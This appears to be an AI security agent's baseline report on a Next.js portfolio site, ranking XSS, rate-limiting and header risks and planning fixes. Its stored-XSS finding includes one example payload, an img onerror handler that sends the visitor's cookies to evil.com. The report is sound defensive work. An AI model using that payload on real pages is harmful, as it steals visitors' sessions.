# Security Baseline Report

**Generated:** January 26, 2026  
**Agent:** Security Engineer (SDLC Embedded)  
**Repository:** mywebsite - Next.js Portfolio  
**Status:** Initial Assessment

---

## Executive Summary

This Next.js/TypeScript portfolio website has **no critical CVEs** in dependencies but contains **3 HIGH-severity** and **2 MEDIUM-severity** security issues requiring immediate attention. The primary concerns are XSS vulnerabilities, lack of rate limiting, and missing security headers.

**Risk Level:** 🟡 MODERATE (High issues present, but no critical CVEs or auth bypass)

---

## 1. Stack Summary

### Technology Stack
- **Framework:** Next.js 16.1.5 (App Router)
- **Runtime:** Node.js (TypeScript 5.x)
- **Frontend:** React 19.2.3, Framer Motion 12.29.2
- **Content:** MDX via @next/mdx, gray-matter, marked
- **Styling:** Tailwind CSS 4.x
- **APIs:** 2 API routes (contact, posts)
- **Additional:** Python 3.x (wallpaper generation script)

### Dependencies Status
- **Total dependencies:** 450 (47 prod, 368 dev)
- **Known CVEs:** 0 ✅
- **Outdated packages:** To be assessed (manual check recommended)
- **Lockfile:** ✅ package-lock.json present and committed

---

## 2. Threat Surface Map

### Entry Points
1. **Public Routes:**
   - `/` (homepage)
   - `/blog` (blog listing)
   - `/blog/[slug]` (individual posts - **HIGH RISK: XSS**)
   - `/contact` (contact form)
   - `/projects`
   - `/os` (OS simulation)

2. **API Endpoints:**
   - `POST /api/contact` (**HIGH RISK: No rate limit, input validation gaps**)
   - `GET /api/posts` (read-only, low risk)

3. **Static Assets:**
   - `/public/wallpapers/*` (images generated via Python script)
   - MDX content in `/content/posts/`

### Trust Boundaries
- **Untrusted Input:**
  - Contact form (name, email, message)
  - MDX blog content (author-controlled, but rendered as HTML)
  - URL parameters (slug in blog routes)

- **Data Flows:**
  - User → Contact Form → API Route → Console Log (no actual email sent)
  - User → Blog Slug → File System → MDX Parser → HTML Renderer (**XSS RISK**)

### External Integrations
- **None active** (email service placeholder only)
- **Future risk:** When email service is integrated, API keys will need secure storage

---

## 3. Top 10 Risks (OWASP Top 10 Alignment)

### 🔴 HIGH Severity

#### 1. **Stored XSS via MDX Content** (A03:2021 – Injection)
- **Location:** [src/app/blog/[slug]/page.tsx](src/app/blog/[slug]/page.tsx#L90)
- **Issue:** `dangerouslySetInnerHTML` used to render MDX content converted via `marked` library without sanitization
- **Exploit Scenario:**
  - Attacker gains write access to `/content/posts/` (e.g., via compromised CI/CD, insider threat, or GitHub access)
  - Creates MDX file with malicious HTML/JS: `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
  - Content is served to all blog visitors, stealing cookies/sessions
- **Impact:** Full client-side compromise, session hijacking, data exfiltration
- **CVSS Estimate:** 7.5 (High)

#### 2. **No Rate Limiting on Contact API** (A07:2021 – Identification and Authentication Failures)
- **Location:** [src/app/api/contact/route.ts](src/app/api/contact/route.ts)
- **Issue:** `POST /api/contact` has no rate limiting or CAPTCHA
- **Exploit Scenario:**
  - Automated bots spam the endpoint with thousands of requests
  - Resource exhaustion (CPU, memory) causes DoS
  - Log pollution makes incident investigation harder
  - Email service costs spike when integrated
- **Impact:** Service degradation, cost overruns, spam flood
- **CVSS Estimate:** 6.5 (Medium-High)

#### 3. **Insufficient Input Validation on Contact Form** (A03:2021 – Injection)
- **Location:** [src/app/api/contact/route.ts](src/app/api/contact/route.ts#L5-L13)
- **Issue:** Basic presence check only; no length limits, format validation, or HTML sanitization
- **Exploit Scenario:**
  - Attacker sends 10MB payload in `message` field → memory exhaustion
  - HTML/script tags in message logged to console → potential log injection
  - When email service is integrated: HTML injection in email body
- **Impact:** DoS, log poisoning, future email template injection
- **CVSS Estimate:** 6.0 (Medium)

### 🟡 MEDIUM Severity

#### 4. **Missing Security Headers** (A05:2021 – Security Misconfiguration)
- **Location:** [next.config.ts](next.config.ts), [src/app/layout.tsx](src/app/layout.tsx)
- **Missing Headers:**
  - `Content-Security-Policy` (CSP) - critical for XSS mitigation
  - `X-Frame-Options` / `frame-ancestors` - clickjacking protection
  - `X-Content-Type-Options: nosniff`
  - `Referrer-Policy: strict-origin-when-cross-origin`
  - `Permissions-Policy`
- **Exploit Scenario:**
  - XSS attacks easier without CSP (defense-in-depth failure)
  - Clickjacking possible (site embedded in malicious iframe)
- **Impact:** Weakened defense layers, easier exploitation of other bugs
- **CVSS Estimate:** 5.0 (Medium)

#### 5. **Hardcoded Email Address in API Route** (A01:2021 – Broken Access Control / Info Disclosure)
- **Location:** [src/app/api/contact/route.ts](src/app/api/contact/route.ts#L21)
- **Issue:** Email address `abhishekyadav@my.unt.edu` hardcoded in source
- **Exploit Scenario:**
  - Email exposed to scrapers, leading to spam/phishing
  - No flexibility to change recipient without redeployment
- **Impact:** Low security impact, but best practice violation
- **CVSS Estimate:** 3.0 (Low)

### 🟢 LOW Severity

#### 6. **Error Messages May Leak Stack Traces** (A04:2021 – Insecure Design)
- **Location:** Multiple `console.error()` calls in API routes
- **Issue:** Error objects logged directly; if logs are exposed or in dev mode, stack traces leak
- **Mitigation:** Already partially addressed (generic error responses to client)
- **Impact:** Minimal (requires access to logs or dev environment)

#### 7. **No Input Size Limits on File System Operations** (A01:2021 – Broken Access Control)
- **Location:** [src/lib/mdx.ts](src/lib/mdx.ts) - `fs.readFileSync` without size checks
- **Issue:** Maliciously large MDX files could cause memory issues
- **Impact:** Low (requires filesystem write access, which is already a critical breach)

#### 8. **No Subresource Integrity (SRI) for External Resources** (A08:2021 – Software and Data Integrity Failures)
- **Issue:** Google Fonts loaded without SRI in [layout.tsx](src/app/layout.tsx)
- **Impact:** CDN compromise could inject malicious code (low probability)

#### 9. **Missing robots.txt Security Directives** (A05:2021 – Security Misconfiguration)
- **Location:** [src/app/robots.ts](src/app/robots.ts)
- **Issue:** No explicit disallow for sensitive paths (if any exist in future)
- **Impact:** Very low (no sensitive paths currently)

#### 10. **Python Script Lacks Input Validation** (A03:2021 – Injection)
- **Location:** [scripts/generate_wallpaper.py](scripts/generate_wallpaper.py)
- **Issue:** Script reads hardcoded paths; if CLI args added later, path traversal risk
- **Impact:** Low (currently no user input)

---

## 4. Quick Wins vs. Structural Improvements

### 🚀 Quick Wins (< 1 hour each)
1. **Add DOMPurify to sanitize blog HTML** (fix XSS) - 30 min
2. **Add Next.js security headers in config** (fix missing headers) - 20 min
3. **Move email to environment variable** (fix hardcoded value) - 10 min
4. **Add basic input length limits to contact API** (partial DoS fix) - 15 min
5. **Add .env.example template** - 5 min

### 🔨 Structural Improvements (2-8 hours)
1. **Implement rate limiting middleware** (Upstash Redis or in-memory) - 2 hours
2. **Add comprehensive input validation with Zod** - 2 hours
3. **Set up CI/CD security scanning** (Semgrep, npm audit) - 3 hours
4. **Add pre-commit secret scanning** (git-secrets or Husky) - 1 hour
5. **Integrate CAPTCHA (hCaptcha/Turnstile) on contact form** - 3 hours

---

## 5. What I Will Fix First and Why

### Phase 2 Immediate Fixes (Priority Order)

#### Fix #1: **Stored XSS via MDX** 🔴 HIGH
- **Why First:** Highest severity, direct user impact, exploitable if attacker gets write access
- **Approach:** 
  - Install `isomorphic-dompurify` and `jsdom`
  - Sanitize HTML output from `marked` before rendering
  - Add CSP header as defense-in-depth
- **ETA:** 45 minutes
- **Branch:** `security/fix-xss-mdx-sanitization`

#### Fix #2: **Missing Security Headers** 🟡 MEDIUM (Defense-in-Depth)
- **Why Second:** Mitigates XSS and other attacks, easy to implement
- **Approach:**
  - Add `headers` config to `next.config.ts`
  - Include CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy
- **ETA:** 30 minutes
- **Branch:** `security/add-security-headers`

#### Fix #3: **Rate Limiting on Contact API** 🔴 HIGH
- **Why Third:** Prevents DoS and abuse, critical for production
- **Approach:**
  - Implement simple in-memory rate limiter (or Upstash Redis if available)
  - Add middleware to `/api/contact`
  - Limit: 5 requests per IP per 15 minutes
- **ETA:** 90 minutes
- **Branch:** `security/add-rate-limiting`

---

## 6. Dependencies Not Yet Scanned

**Action Items:**
- [ ] Run `npm outdated` to identify stale packages
- [ ] Check `marked` library for known XSS bypasses (CVE history)
- [ ] Verify `framer-motion` and `react-rnd` for known issues
- [ ] Set up Snyk or Dependabot for continuous monitoring

---

## 7. Compliance & Standards

### OWASP ASVS Alignment
- **Level 1 (Opportunistic):** Partially compliant
  - ✅ Basic input validation
  - ❌ Missing output encoding (XSS risk)
  - ❌ No rate limiting
  - ❌ Missing security headers

### CWE Coverage
- **CWE-79 (XSS):** HIGH exposure
- **CWE-770 (Resource Exhaustion):** MEDIUM exposure
- **CWE-116 (Output Encoding):** HIGH exposure
- **CWE-1021 (CSP Missing):** MEDIUM exposure

---

## 8. Testing & Validation Strategy

For each fix:
1. **Unit Tests:** Validate sanitization logic, rate limiter behavior
2. **Integration Tests:** End-to-end contact form submission
3. **Manual Testing:** XSS payloads (e.g., OWASP XSS cheat sheet)
4. **Security Regression:** CI pipeline will run automated SAST

---

## 9. Next Steps

### Immediate (Next 4 hours)
1. ✅ Baseline report created
2. ⏳ Fix XSS vulnerability (PR #1)
3. ⏳ Add security headers (PR #2)
4. ⏳ Implement rate limiting (PR #3)

### Short-Term (Next 2 weeks)
1. Add CI/CD security checks (Semgrep, npm audit, secret scanning)
2. Create SECURITY.md for vulnerability disclosure
3. Add threat model documentation
4. Implement comprehensive input validation with Zod
5. Add pre-commit hooks for secret detection

### Long-Term (Next quarter)
1. Integrate CAPTCHA on contact form
2. Set up CSP reporting endpoint
3. Implement security monitoring (e.g., Sentry for errors)
4. Regular dependency updates via Dependabot
5. Conduct external security audit

---

## 10. Secure Development Guardrails (To Be Added)

### CI/CD Pipeline (GitHub Actions)
```yaml
# Planned checks:
- SAST: Semgrep (JS/TS security rules)
- Dependency Scan: npm audit (fail on HIGH+)
- Secret Scan: Gitleaks or TruffleHog
- Linting: ESLint with eslint-plugin-security
- Build Test: Ensure production build succeeds
```

### Pre-Commit Hooks (Husky)
```bash
# Planned hooks:
- Secret detection (git-secrets pattern matching)
- ESLint with security plugin
- TypeScript type checking
```

---

## Appendix A: Known Safe Patterns

✅ **Good Practices Already in Place:**
1. TypeScript for type safety
2. Lockfile committed (supply chain integrity)
3. Generic error messages returned to clients (no stack trace leaks in prod)
4. Server-side rendering reduces client-side attack surface
5. No SQL/NoSQL database (eliminates injection risk)
6. No authentication/session management (reduces auth attack surface)
7. MDX content is author-controlled (not user-generated)

---

## Appendix B: Future Considerations

**When adding features, ensure:**
- [ ] Any new API routes have rate limiting
- [ ] User-generated content is sanitized (if forums/comments added)
- [ ] File uploads are validated (type, size, content) if implemented
- [ ] Authentication uses secure libraries (NextAuth.js, Auth0, etc.)
- [ ] Secrets are stored in environment variables or secret managers
- [ ] All third-party integrations are reviewed for security

---

**Report Maintained By:** Security Engineer Agent  
**Last Updated:** January 26, 2026  
**Next Review:** Post-fix validation (estimated: 4 hours from now)
